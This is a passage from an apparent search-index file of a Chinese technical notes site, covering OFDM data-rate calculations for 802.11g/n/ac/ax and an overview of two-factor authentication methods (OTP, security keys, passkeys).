\u200b\u7684\u200b\u6838\u5fc3\u601d\u60f3\u200b\u5c31\u662f\u200b\u91c7\u7528\u200b\u591a\u4e2a\u200b\u8f7d\u6ce2\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u8f7d\u6ce2\u200b\u4fe1\u53f7\u200b\u7684\u200b\u9891\u7387\u200b\u5448\u200b\u7b49\u5dee\u6570\u5217\u200b\uff0c\u200b\u540c\u65f6\u200b\u4fdd\u8bc1\u200b\u5404\u200b\u8f7d\u6ce2\u200b\u76f8\u4e92\u200b\u6b63\u4ea4\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u63d0\u9ad8\u200b\u4e86\u200b\u6570\u636e\u200b\u4f20\u8f93\u901f\u7387\u200b\u3002\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u6b63\u4ea4\u200b\uff0c\u200b\u76f8\u90bb\u200b\u8f7d\u6ce2\u200b\u4fe1\u53f7\u200b\u7684\u200b\u9891\u7387\u200b\u7684\u200b\u5dee\u8981\u200b\u6ee1\u8db3\u200b \\(\\Delta{f} = k / T_U\\) \uff0c\u200b\u5176\u4e2d\u200b k \u200b\u662f\u200b\u6b63\u6574\u6570\u200b\uff0c \\(T_U\\) \u200b\u662f\u200b\u6bcf\u4e2a\u200b symbol \u200b\u7684\u200b\u65f6\u95f4\u200b\uff08\u200b\u5f15\u7528\u200b wikipedia\uff09\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b 802.11 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u7684\u200b OFDM PHY \u200b\u7684\u200b\u7ec4\u6210\u200b\uff1a</p> <p> </p> 802.11 OFDM PHY\uff08\u200b\u56fe\u6e90\u200b IEEE 802.11\uff09 <p>\u200b\u56fe\u4e2d\u200b\u7684\u200b\u7f29\u5199\u200b\uff1a</p> <ul> <li>FEC: Forward Error Correction</li> <li>IFFT/FFT: Inverse Fast Fourier Transform/Fast Fourier Transform</li> <li>GI: Guard Interval</li> <li>I/Q: In-phase/Quadrature</li> <li>HPA: High Power Amplifier</li> <li>LNA: Low Noise Amplifier</li> <li>AGC: Automatic Gain Control</li> <li>AFC: Automatic Frequency Control</li> </ul> <p>802.11g \u200b\u7684\u200b\u4fe1\u53f7\u200b\u5e26\u5bbd\u200b\u662f\u200b 20MHz\uff0c\u200b\u5206\u6210\u200b 52 \u200b\u4e2a\u5b50\u200b\u8f7d\u6ce2\u200b\uff0c\u200b\u5b50\u200b\u8f7d\u6ce2\u200b\u7684\u200b\u95f4\u8ddd\u200b\u662f\u200b 0.3125 MHz\uff0820 MHz / 64\uff0c\\(T_{FFT}=3.2 \\mu s, \\Delta{f} = 1 / T_{FFT}\\) \uff09\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u53ea\u200b\u5360\u200b\u4e86\u200b \\(0.3125 \\mathrm{MHz} * 52 = 16.25 \\mathrm{MHz}\\) \u200b\u7684\u200b\u9891\u8c31\u200b\u3002\u200b\u5176\u4e2d\u200b 48 \u200b\u4e2a\u200b\u7528\u4e8e\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u8f7d\u6ce2\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b\u8c03\u5236\u200b\u65b9\u6cd5\u200b\u300254 Mbps \u200b\u662f\u200b\u600e\u4e48\u200b\u7b97\u200b\u7684\u200b\u5462\u200b\uff1f802.11g \u200b\u7684\u200b Symbol rate \u200b\u662f\u200b 250000 \u200b\u6bcf\u79d2\u200b\uff08\u200b\u56e0\u4e3a\u200b \\(T_{SYM} = 3.2 + 0.8 = 4 \\mu s\\) \uff09\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b 64-QAM \u200b\u8c03\u5236\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b symbol \u200b\u5bf9\u5e94\u200b 6 \u200b\u4e2a\u200b bit\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b\u7ea0\u9519\u7801\u200b\uff0c\u200b\u7ea0\u9519\u200b\u7684\u200b\u65f6\u5019\u200b\u6d6a\u8d39\u200b\u4e86\u200b 1/4 \u200b\u7684\u200b\u4f4d\u200b\uff0c\u200b\u5b9e\u9645\u200b\u6570\u636e\u200b\u5360\u200b 3/4\uff0c\u200b\u4e00\u5171\u200b 48 \u200b\u4e2a\u200b\u8f7d\u6ce2\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u5c31\u662f\u200b \\(48 * 250000 * 6 * 3/4 = 54 \\mathrm{Mbps}\\) \u3002</p>"},{"location":"networking/wlan.html#80211n","title":"802.11n","text":"<p>802.11n \u200b\u5728\u200b 802.11g \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e86\u200b MIMO\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u53ef\u4ee5\u200b\u7528\u200b\u591a\u4e2a\u200b\u5929\u7ebf\u200b\u540c\u65f6\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u8fd8\u662f\u200b\u8003\u8651\u200b\u5355\u200b\u5929\u7ebf\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u57fa\u672c\u200b\u548c\u200b 802.11g \u200b\u76f8\u540c\u200b\uff0c\u200b\u533a\u522b\u200b\u662f\u200b\u91c7\u7528\u200b\u4e86\u200b 52\uff08 \\(N_{SD}\\) \uff09\u200b\u4e2a\u200b OFDM \u200b\u5b50\u200b\u8f7d\u6ce2\u200b\u7528\u4e8e\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u540c\u65f6\u200b\u7ea0\u9519\u7801\u200b\u5e26\u6765\u200b\u7684\u200b\u6d6a\u8d39\u200b\u6bd4\u4f8b\u200b\u4ece\u200b 1/4 \u200b\u964d\u5230\u200b\u4e86\u200b 1/6\uff0c\u200b\u6240\u4ee5\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u662f\u200b \\(52 * 250000 * 6 * 5/6 = 65 \\mathrm{Mbps}\\) \u3002802.11n \u200b\u8fd8\u200b\u63d0\u4f9b\u200b\u4e86\u200b Short GI\uff08Guard Interval\uff09\u200b\u9009\u9879\u200b\uff0c\u200b\u628a\u200b GI \u200b\u4ece\u200b 800 ns \u200b\u964d\u4f4e\u200b\u5230\u200b 400ns\uff0c\u200b\u4f7f\u5f97\u200b\u6bcf\u4e2a\u200b symbol \u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u4ee5\u200b\u4ece\u200b \\(3.2 + 0.8 = 4 \\mu s\\)) \u200b\u964d\u4f4e\u200b\u5230\u200b \\(3.2 + 0.4 = 3.6 \\mu s\\) \uff0c\u200b\u6b64\u65f6\u200b\u7684\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u8fbe\u5230\u200b \\(52 * 1000000 / 3.6 * 6 * 5/6 = 72.2 \\mathrm{Mbps}\\)\u3002</p> <p>\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c802.11n \u200b\u8fd8\u200b\u5f15\u5165\u200b\u4e86\u200b 40 MHz \u200b\u9891\u5bbd\u200b\u7684\u200b\u9009\u9879\u200b\uff0c\u200b\u4ee5\u200b\u5360\u7528\u200b\u66f4\u200b\u591a\u200b\u9891\u8c31\u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff0c\u200b\u6362\u6765\u200b\u53ef\u4ee5\u200b\u7528\u200b 108 \u200b\u4e2a\u5b50\u200b\u8f7d\u6ce2\u200b\u6765\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b \\(108 * 1000000 / 3.6 * 6 * 5 / 6 = 150 \\mathrm{Mbps}\\)\u3002</p> <p>\u200b\u8003\u8651\u200b\u591a\u200b\u5929\u7ebf\u200b\uff0c\u200b\u5982\u679c\u200b\u540c\u65f6\u200b\u4e24\u6839\u200b\u5929\u7ebf\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u5c31\u662f\u200b\u4e24\u500d\u200b\uff0c\u200b\u8fbe\u5230\u200b \\(300 \\mathrm{Mbps}\\) \uff1b\u200b\u6700\u9ad8\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u56db\u6839\u200b\u5929\u7ebf\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u6700\u9ad8\u200b\u7406\u8bba\u503c\u200b\u662f\u200b \\(600 \\mathrm{Mbps}\\) \u3002</p>"},{"location":"networking/wlan.html#80211ac","title":"802.11ac","text":"<p>802.11ac \u200b\u6dfb\u52a0\u200b\u4e86\u200b 160 MHz \u200b\u9891\u5bbd\u200b\u7684\u200b\u9009\u9879\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b 468 \u200b\u4e2a\u5b50\u200b\u8f7d\u6ce2\u200b\uff0c\u200b\u8c03\u5236\u200b\u65b9\u5f0f\u200b\u4ece\u200b 64-QAM \u200b\u63d0\u5347\u200b\u5230\u200b 256-QAM\uff0c\u200b\u540c\u65f6\u200b\u6700\u5927\u200b\u53ef\u4ee5\u200b\u6709\u200b 8 \u200b\u6839\u200b\u5929\u7ebf\u200b\u540c\u65f6\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6700\u5927\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u662f\u200b \\(468 * 1000000 / 3.6 * 8 * 5 / 6 * 8 = 6933.3 \\mathrm{Mbps}\\) \u3002</p> <p>\u200b\u7531\u6b64\u53ef\u89c1\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u65e0\u7ebf\u7f51\u7edc\u200b\u7684\u200b\u901f\u7387\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b\u63d0\u9ad8\u200b\u4e0a\u5f0f\u200b\u7684\u200b\u5404\u4e2a\u200b\u7cfb\u6570\u200b\uff1a</p> <ul> <li>\u200b\u5b50\u200b\u8f7d\u6ce2\u200b\u6570\u91cf\u200b\uff1a\u200b\u589e\u52a0\u200b\u9891\u5bbd\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u9891\u5bbd\u200b\u4e00\u5b9a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7559\u51fa\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5b50\u200b\u8f7d\u6ce2\u200b\u7528\u4e8e\u200b\u6570\u636e\u200b\uff0c\u200b\u63d0\u5347\u200b\u8f83\u5927\u200b\uff0c\u200b\u4f46\u200b\u9891\u7387\u200b\u4e0d\u80fd\u200b\u592a\u5bbd\u200b</li> <li>Symbol \u200b\u65f6\u95f4\u200b\uff1a\u200b\u51cf\u5c11\u200b Guard Interval\uff0c\u200b\u63d0\u5347\u200b\u4e0d\u200b\u5927\u200b</li> <li>QAM \u200b\u4f4d\u6570\u200b\uff1a\u200b\u4ece\u200b PSK \u200b\u5230\u200b 4-QAM \u200b\u5230\u200b 64-QAM \u200b\u5230\u200b 256-QAM\uff0c\u200b\u63d0\u5347\u200b\u96be\u5ea6\u200b\u8f83\u5927\u200b</li> <li>\u200b\u7ea0\u9519\u7801\u200b\u5f00\u9500\u200b\uff1a\u200b\u4e0d\u4f1a\u200b\u8d85\u8fc7\u200b 1\uff0c\u200b\u96be\u4ee5\u200b\u63d0\u5347\u200b</li> <li>\u200b\u66f4\u200b\u591a\u200b\u5929\u7ebf\u200b\uff1a\u200b\u4ece\u200b 1 \u200b\u5230\u200b 4 \u200b\u5230\u200b 8\uff0c\u200b\u672a\u6765\u200b\u5230\u200b 16\uff0c\u200b\u9010\u6b65\u200b\u63d0\u5347\u200b</li> </ul> <p>\u200b\u6240\u4ee5\u200b\u8981\u200b\u8fdb\u4e00\u6b65\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u4e3b\u8981\u200b\u4ece\u5b50\u200b\u8f7d\u6ce2\u200b\u6570\u91cf\u200b\u3001QAM \u200b\u4f4d\u6570\u200b\u548c\u200b MIMO \u200b\u6570\u91cf\u200b\u4e0a\u200b\u505a\u6587\u7ae0\u200b\u3002</p>"},{"location":"networking/wlan.html#80211ax","title":"802.11ax","text":"<p>802.11ax \u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b 1960 \u200b\u4e2a\u5b50\u200b\u8f7d\u6ce2\u200b\uff08\u200b\u95f4\u8ddd\u200b\u4ece\u200b 312.5 kHz \u200b\u7f29\u5c0f\u200b\u5230\u200b 78.125 kHz\uff0c\\(\\Delta{f} = 78.125 kHz, T_{FFT} = 1 / \\Delta{f} = 12.8 \\mu s\\) \uff09\uff0c\u200b\u8c03\u5236\u200b\u65b9\u5f0f\u200b\u4ece\u200b 256-QAM \u200b\u63d0\u5347\u200b\u5230\u200b 1024-QAM\uff0c\u200b\u4f46\u662f\u200b \\(T_{SYM}\\) \u200b\u4e5f\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b \\(12.8 + 0.8 = 13.6 \\mu s\\) \uff0c\u200b\u6700\u5927\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u662f\u200b \\(1960 * 1000000 / 13.6 * 10 * 5 / 6 * 8 = 9607.8 \\mathrm{Mbps}\\) \u3002</p>"},{"location":"networking/wlan.html#ofdm","title":"OFDM \u200b\u5bf9\u6bd4","text":"<p>\u200b\u4e0b\u9762\u200b\u603b\u7ed3\u200b\u4e86\u200b\u4f7f\u7528\u200b OFDM \u200b\u7684\u200b PHY \u200b\u7684\u200b\u5404\u9879\u200b\u53c2\u6570\u200b\uff0c\u200b\u5176\u4e2d\u200b Data rate \u200b\u7684\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\uff1a<code>Subcarrier * 1000000 / T_{SYM} * Coding Rate * MIMO streams</code>\u3002</p> Standard Subcarrier T_{SYM} QAM bits Coding Rate MIMO streams Data rate 802.11g 48 4 us 6 3/4 1 54 Mbps 802.11n 108 3.6 us 6 5/6 4 600 Mbps 802.11ac 468 3.6 us 8 5/6 8 6933.3 Mbps 802.11ax 1960 13.6 us 10 5/6 8 9607.8 Mbps"},{"location":"software/2fa.html","title":"2FA","text":"<p>2FA \u200b\u6307\u200b\u7684\u200b\u662f\u200b Two factor authentication\uff0c\u200b\u6838\u5fc3\u601d\u60f3\u200b\u662f\u200b\uff0c\u200b\u57fa\u4e8e\u200b\u5bc6\u7801\u200b\u7684\u200b\u8ba4\u8bc1\u200b\u592a\u200b\u8106\u5f31\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8981\u200b\u7528\u200b\u989d\u5916\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u9a8c\u8bc1\u200b\u7528\u6237\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b 2FA \u200b\u65b9\u6848\u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li>\u200b\u77ed\u4fe1\u200b\uff1a\u200b\u56fd\u5185\u200b\u6700\u200b\u719f\u6089\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u767b\u5f55\u200b\u65f6\u200b\uff0c\u200b\u9664\u4e86\u200b\u8f93\u5165\u200b\u7528\u6237\u540d\u200b\u5bc6\u7801\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u63a5\u6536\u200b\u77ed\u4fe1\u200b\u9a8c\u8bc1\u7801\u200b\uff1b\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u56fd\u5185\u200b\u5f88\u591a\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u77ed\u4fe1\u200b\u767b\u5f55\u200b\u5df2\u7ecf\u200b\u6210\u4e3a\u200b\u4e86\u200b\u66ff\u4ee3\u5bc6\u7801\u200b\u7684\u200b\u767b\u5f55\u200b\u65b9\u6848\u200b\uff0c\u200b\u4e0d\u200b\u8f93\u5165\u200b\u7528\u6237\u540d\u200b\u5bc6\u7801\u200b\uff0c\u200b\u76f4\u63a5\u200b\u7528\u200b\u624b\u673a\u53f7\u200b\u548c\u200b\u77ed\u4fe1\u200b\u9a8c\u8bc1\u7801\u200b\u767b\u5f55\u200b</li> <li>OTP\uff1a\u200b\u901a\u5e38\u200b\u662f\u200b 6 \u200b\u4f4d\u200b\u7684\u200b\u52a8\u6001\u200b\u6570\u5b57\u200b\u5bc6\u7801\u200b\uff0c\u200b\u6216\u8005\u200b\u4e00\u4e32\u200b\u5c0f\u5199\u200b\u82f1\u6587\u5b57\u6bcd\u200b</li> <li>Security Key\uff1a\u200b\u4ee5\u200b Yubikey \u200b\u4e3a\u200b\u4ee3\u8868\u200b\u7684\u200b\u786c\u4ef6\u200b\u5bc6\u94a5\u200b</li> </ol> <p>\u200b\u914d\u7f6e\u200b 2FA \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u8fd8\u4f1a\u200b\u751f\u6210\u200b\u4e00\u4efd\u200b Recovery code\u3002\u200b\u76ee\u7684\u200b\u662f\u200b\u5982\u679c\u200b\u54ea\u5929\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u767b\u5f55\u200b 2FA\uff0c\u200b\u4f8b\u5982\u200b Key \u200b\u4e0d\u89c1\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b Recovery code \u200b\u767b\u5f55\u200b\u8fdb\u53bb\u200b\u3002</p>"},{"location":"software/2fa.html#otp","title":"OTP","text":"<p>\u200b\u901a\u5e38\u200b\u662f\u200b 6 \u200b\u4f4d\u200b\u7684\u200b\u52a8\u6001\u200b\u6570\u5b57\u200b\u5bc6\u7801\u200b\uff0c\u200b\u5206\u4e3a\u200b TOTP\uff08Time-based\uff09\u200b\u548c\u200b HOTP\uff08HMAC-based\uff09\u200b\u4e24\u79cd\u200b\uff0c\u200b\u4e00\u822c\u200b\u4f1a\u200b\u5728\u200b\u7528\u200b Authenticator App \u200b\u91cc\u9762\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u786c\u4ef6\u200b\u7684\u200b OTP \u200b\u8bbe\u5907\u200b\uff0c\u200b\u4f8b\u5982\u200b RSA SecurID\u3002\u200b\u914d\u7f6e\u200b\u65f6\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u8f93\u51fa\u200b\u4e00\u4e2a\u200b\u4e8c\u7ef4\u7801\u200b\uff0c\u200b\u4f9b\u200b Authenticator App \u200b\u626b\u63cf\u200b\uff0c\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u91cc\u9762\u200b\u7684\u200b secret\uff0c\u200b\u5b83\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b OTP \u200b\u5bc6\u7801\u200b\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u767b\u5f55\u200b\u5f62\u5f0f\u200b\u662f\u200b\uff0c\u200b\u8f93\u5165\u200b\u7528\u6237\u540d\u200b\u6216\u200b\u5bc6\u7801\u200b\u540e\u200b\uff0c\u200b\u63d0\u793a\u200b\u8f93\u5165\u200b 6 \u200b\u4f4d\u200b\u52a8\u6001\u200b\u6570\u5b57\u200b\u5bc6\u7801\u200b\u3002\u200b\u4e00\u4e9b\u200b\u65f6\u5019\u200b\u4e5f\u200b\u652f\u6301\u200b\u5728\u200b\u5bc6\u7801\u200b\u540e\u200b\u7d27\u8ddf\u200b 6 \u200b\u4f4d\u200b\u52a8\u6001\u200b\u5bc6\u7801\u200b\u3002</p> <p>\u200b\u6709\u65f6\u200b OTP \u200b\u4e5f\u200b\u4e0d\u662f\u200b\u7eaf\u200b\u6570\u5b57\u200b\uff0c\u200b\u4f8b\u5982\u200b Yubico OTP \u200b\u5c31\u662f\u200b\u4e00\u4e32\u200b\u5c0f\u5199\u5b57\u6bcd\u200b\u3002\u200b\u6b64\u65f6\u200b\u7684\u200b\u64cd\u4f5c\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u8f93\u5165\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e0d\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u800c\u662f\u200b\u957f\u200b\u6309\u200b Yubikey \u200b\u7684\u200b\u89e6\u6478\u200b\u70b9\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u5c31\u200b\u4f1a\u200b\u6a21\u62df\u200b\u952e\u76d8\u8f93\u5165\u200b OTP \u200b\u5e76\u200b\u56de\u8f66\u200b\u3002\u200b\u6b64\u65f6\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4f1a\u200b\u8ddf\u7740\u200b Yubico OTP \u200b\u4e00\u8d77\u200b\u53d1\u9001\u5230\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5b8c\u6210\u200b\u8ba4\u8bc1\u200b\u3002</p>"},{"location":"software/2fa.html#security-key","title":"Security Key","text":"<p>\u200b\u4ee5\u200b Yubikey \u200b\u4e3a\u200b\u4ee3\u8868\u200b\u7684\u200b\u786c\u4ef6\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u534f\u8bae\u200b\u901a\u5e38\u200b\u662f\u200b U2F\uff08\u200b\u65e9\u671f\u200b\uff09\u200b\u6216\u8005\u200b CTAP2\uff08\u200b\u6bd4\u8f83\u200b\u65b0\u200b\uff09\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u8f93\u5165\u200b\u7528\u6237\u540d\u200b\u5bc6\u7801\u200b\u4ee5\u540e\u200b\uff0c\u200b\u63d2\u5165\u200b Security Key \u200b\u5e76\u200b\u89e6\u6478\u200b Key \u200b\u4e0a\u200b\u7684\u200b\u6307\u5b9a\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b8c\u6210\u200b\u8ba4\u8bc1\u200b\u3002</p> <p>U2F \u200b\u662f\u200b\u65e9\u671f\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u540e\u6765\u200b\u6539\u540d\u200b\u4e3a\u200b CTAP \u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u7248\u672c\u200b CTAP1\uff0c\u200b\u73b0\u5728\u200b\u6700\u65b0\u7248\u200b\u662f\u200b CTAP2\u3002\u200b\u9664\u4e86\u200b CTAP \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u7f51\u7ad9\u200b\u7684\u200b API\uff1aWebAuthn\u3002\u200b\u5f00\u53d1\u200b\u8fd9\u4e9b\u200b\u6807\u51c6\u200b\u7684\u200b\u662f\u200b FIDO Alliance \u200b\u7ec4\u7ec7\u200b\u3002</p>"},{"location":"software/2fa.html#passkeypasswordless","title":"Passkey/Passwordless","text":"<p>Passkey \u200b\u6216\u8005\u200b Passwordless \u200b\u5176\u5b9e\u200b\u4e0d\u80fd\u200b\u7b97\u200b\u5728\u200b 2FA \u200b\u91cc\u9762\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u7528\u200b Security Key \u200b\u7684\u200b\u6280\u672f\u200b\u548c\u200b API\uff0c\u200b\u53bb\u200b\u53d6\u4ee3\u200b\u5bc6\u7801\u200b\u7684\u200b\u5b58\u5728\u200b\u3002\u200b\u5b83\u200b\u7528\u200b\u7684\u200b\u5176\u5b9e\u200b\u8fd8\u662f\u200b CTAP \u200b\u534f\u8bae\u200b\u548c\u200b WebAuthn \u200b\u7684\u200b API\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u56e0\u4e3a\u200b\u66ff\u4ee3\u200b\u4e86\u200b\u5bc6\u7801\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6362\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u597d\u8bb0\u200b\u7684\u200b\u540d\u5b57\u200b <code>Passkey</code>\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5b83\u200b\u7528\u5230\u200b\u4e86\u200b CTAP2 \u200b\u7684\u200b\u65b0\u200b\u529f\u80fd\u200b\uff1aResident Key/Discoverable Credentials\u3002\u200b\u5728\u200b U2F \u200b\u65f6\u4ee3\u200b\uff0c\u200b\u6570\u636e\u200b\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b\u7f51\u7ad9\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\uff0c\u200b\u7528\u6237\u200b\u5728\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u767b\u5f55\u200b\uff0c\u200b\u7f51\u7ad9\u200b\u670d\u52a1\u7aef\u200b\u53d1\u9001\u6570\u636e\u200b\u7ed9\u200b\u6d4f\u89c8\u5668\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u8f6c\u7ed9\u200b Key\uff0cKey \u200b\u62ff\u5230\u200b\u6570\u636e\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5bc6\u94a5\u200b\u8fdb\u884c\u200b\u7b7e\u540d\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u8ba4\u8bc1\u200b\uff1b\u200b\u800c\u200b\u6709\u200b\u4e86\u200b Resident Key \u200b\u4ee5\u540e\u200b\uff0cKey \u200b\u4e5f\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4ece\u200b Key \u200b\u4e2d\u200b\u679a\u4e3e\u200b Resident Key\uff0c\u200b\u6839\u636e\u200b metadata\uff0c\u200b\u7b5b\u9009\u200b\u51fa\u200b\u5c5e\u4e8e\u200b\u5f53\u524d\u200b\u8bbf\u95ee\u200b\u7684\u200b\u7f51\u7ad9\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u518d\u200b\u53d1\u7ed9\u200b Key\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u6d41\u7a0b\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b WebAuthn Resident Key: Discoverable Credentials as Passkeys\u3002\u200b\u4e0d\u8fc7\u200b\u6bd5\u7adf\u200b\u786c\u4ef6\u200b\u7a7a\u95f4\u200b\u6709\u9650\u200b\uff0cResident Key \u200b\u6570\u91cf\u200b\u4e5f\u200b\u662f\u200b\u6709\u9650\u200b\u7684\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u65e2\u7136\u200b\u662f\u200b\u66ff\u4ee3\u5bc6\u7801\u200b\uff08\u200b\u751a\u81f3\u200b\u66ff\u4ee3\u200b\u7528\u6237\u540d\u200b\uff09\uff0c\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u7528\u200b\u666e\u901a\u200b\u7684\u200b\u89e6\u6478\u200b\uff0c\u200b\u800c\u662f\u200b\u8981\u200b\u7528\u200b\u751f\u7269\u200b\u8ba4\u8bc1\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6307\u7eb9\u200b\u3001\u200b\u4eba\u8138\u200b\u7b49\u7b49\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u539f\u6765\u200b\u7531\u200b\u7269\u7406\u200b Security Key \u200b\u63d0\u4f9b\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u73b0\u5728\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5728\u200b\u7535\u8111\u200b\u4e0a\u200b\u5b89\u5168\u200b\u5730\u200b\u5b9e\u73b0\u200b\u4e86\u200b\uff1a\u200b\u5229\u7528\u200b\u5e73\u53f0\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5b89\u5168\u200b\u673a\u5236\u200b\uff0c\u200b\u4f8b\u5982\u200b Secure Enclave\uff0cTPM \u200b\u7b49\u7b49\u200b\uff0c\u200b\u7ed3\u5408\u200b Touch ID/Face ID/Windows Hello \u200b\u7b49\u200b\u751f\u7269\u200b\u8ba4\u8bc1\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u7c7b\u4f3c\u200b Security Key \u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u800c\u4e14\u200b\u5728\u200b\u7535\u8111\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4e0d\u592a\u200b\u9700\u8981\u200b\u8003\u8651\u200b Resident Key \u200b\u7684\u200b\u4e0a\u9650\u200b\u95ee\u9898\u200b\u3002\u200b\u6240\u4ee5\u200b\u67d0\u79cd\u610f\u4e49\u200b\u4e0a\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8fd9\u200b\u662f\u200b\u5728\u200b\u62a2\u200b Yubikey \u200b\u7b49\u200b Security Key 